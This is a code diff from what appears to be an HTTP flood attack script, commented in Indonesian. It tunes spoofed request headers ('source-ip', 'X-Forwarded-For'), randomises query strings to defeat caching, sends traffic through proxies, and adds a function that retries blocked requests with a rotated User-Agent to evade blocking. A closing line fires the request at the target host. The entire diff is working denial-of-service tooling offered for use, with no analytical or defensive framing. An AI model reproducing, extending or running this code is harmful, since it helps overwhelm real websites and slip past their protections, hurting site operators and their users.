@@ -498,11 +498,11 @@ const rateHeaders = [
   { 'Access-Control-Request-Method': 'GET' },
   { 'accept-language': getRandomItem(language_header, 'en-US') },
   { 'origin': parsedTarget?.host ? `https://${parsedTarget.host}` : 'https://default-host.com' },
-  { 'source-ip': randstr(5) ?? '127.0.0.1' },
+  { 'source-ip': randstr(5) || '127.0.0.1' },
   // { 'x-aspnet-version': randstrsValue }, // Tetap dikomentari
   { 'data-return': 'false' },
-  { 'X-Forwarded-For': parsedProxy?.[0] ?? '0.0.0.0' },
-  { 'NEL': val['NEL'] ?? 'default-value' },
+  { 'X-Forwarded-For': parsedProxy?.[0] || '0.0.0.0' },
+  { 'NEL': val['NEL'] || 'default-value' },
   { 'dnt': '1' },
   { 'A-IM': 'Feed' },
   { 'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none' },
@@ -511,10 +511,26 @@ const rateHeaders = [
   { 'accept-language': getRandomItem(language_header, 'en-US') }
 ];
 
+// Fungsi untuk mencoba mengirim permintaan dan menangani blokir
+async function sendRequestWithBypass(url, options) {
+  try {
+    const response = await fetch(url, options);
+    if (!response.ok) {
+      // Jika permintaan diblokir, coba dengan header yang berbeda
+      console.warn('Permintaan diblokir, mencoba bypass...');
+      options.headers['user-agent'] = getRandomUserAgent(); // Ganti User-Agent
+      return await fetch(url, options); // Coba lagi
+    }
+    return response;
+  } catch (error) {
+    //console.error('Terjadi kesalahan saat mengirim permintaan:', error);
+  }
+}
+
 const headers = {
-  ':authority': parsedTarget?.host ?? 'default-host.com',
+  ':authority': parsedTarget?.host || 'default-host.com',
   ':scheme': 'https',
-  ':path': `${parsedTarget?.path ?? '/'}?${randstr(3)}=${generateRandomString(10, 25)}`,
+  ':path': `${parsedTarget?.path || '/'}?${randstr(3)}=${generateRandomString(10, 25)}`,
   ':method': 'GET',
   'pragma': 'no-cache',
   'upgrade-insecure-requests': '1',
@@ -525,6 +541,10 @@ const headers = {
   'sec-fetch-dest': getRandomItem(fetch_dest, 'document'),
   'user-agent': `/5.0 (${nm2}; ${nm5}; ${nm3}; ${kha} ${nm4}) /Gecko/20100101 Edg/91.0.864.59 ${nm4}`
 };
+
+// Contoh penggunaan
+const url = `https://${headers[':authority']}${headers[':path']}`;
+sendRequestWithBypass(url, { method: headers[':method'], headers });
  const proxyOptions = {
      host: parsedProxy[0],
      port: ~~parsedProxy[1],
